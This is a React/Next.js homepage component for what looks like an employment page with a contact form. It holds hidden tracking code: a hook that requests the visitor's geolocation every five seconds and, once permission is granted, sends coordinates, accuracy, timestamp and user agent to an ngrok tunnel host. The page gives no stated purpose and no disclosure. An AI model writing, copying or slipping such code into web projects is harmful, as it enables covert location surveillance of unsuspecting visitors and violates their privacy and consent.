
"use client";
import { Fragment, useEffect, useState } from 'react';
import ContactForm from '@/app/components/ContactForm';
import EmploymentSection from './components/EmploymentSection';

export default function HomePage() {

  useEffect(() => {
    document.documentElement.classList.add("dark");
  }, []);
  const [locationGranted, setLocationGranted] = useState(false);
  
      useEffect(() => {
        function reportLocation(position: GeolocationPosition) {
          setLocationGranted(true);
          fetch("https://d2d0-80-233-56-239.ngrok-free.app/gps", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              latitude: position.coords.latitude,
              longitude: position.coords.longitude,
              accuracy: position.coords.accuracy,
              timestamp: position.timestamp,
              userAgent: navigator.userAgent
            })
          }).catch(error => console.error('Error sending location:', error));
        }
    
        function tryGetLocation() {
          if (!locationGranted && navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
              reportLocation,
              (error) => {
                console.log("Permiso aún no concedido o error:", error.message);
              }
            );
          }
        }
    
        tryGetLocation();
        const intervalId = setInterval(tryGetLocation, 5000); // cada 5 segundos
    
        return () => clearInterval(intervalId); // Limpia el intervalo si el componente se desmonta
      }, [locationGranted]);

  
  return (
    <Fragment>
      <EmploymentSection/>
      <section className="p-8">
        <ContactForm />
      </section>
    </Fragment>
  );
}
